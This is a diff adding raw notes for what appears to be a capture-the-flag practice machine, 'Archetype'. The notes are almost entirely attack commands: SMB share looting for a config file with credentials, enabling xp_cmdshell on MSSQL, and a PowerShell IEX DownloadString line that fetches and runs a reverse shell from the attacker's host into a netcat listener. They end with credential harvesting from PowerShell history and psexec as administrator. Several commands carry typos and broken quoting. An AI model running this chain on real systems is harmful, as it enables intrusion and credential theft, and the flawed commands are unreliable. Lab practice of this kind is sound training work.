@@ -1,0 +1,32 @@
+nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.10.10.27
+smbcclient -L //10.10.10.27
+smbclient //10.10.10.27/backups
+get prod.dtsConfig
+cat prod.dtsConfig
+mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -window-auth
+EXEC sp_configure 'Show Advanced Options', 1;
+reconfigure;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell',1
+reconfigure;
+xp_cmdshell "whoami"
+cd repo/archetype/
+cp shell.ps1 server/
+sudo python3 -m http.server 80
+sudo ufw allow from 10.10.10.27 proto tcp to any port 80,443
+sudo apt-get install rlwrap -y
+sudo rlwrap nc -nlvp 443
+COPY THIS INTO SQL SERVER AND CHANGE IP ETC
+xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");
+
+NETCAT:
+whoami
+
+more \users\sql_svc\desktop\user.txt
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+COPY PASSWORD:
+psexec.py adminstrator@10.10.10.27
+enter password 
+
+C:> whoami
+C:/> more \users\adminstrator\desktop\root.txt
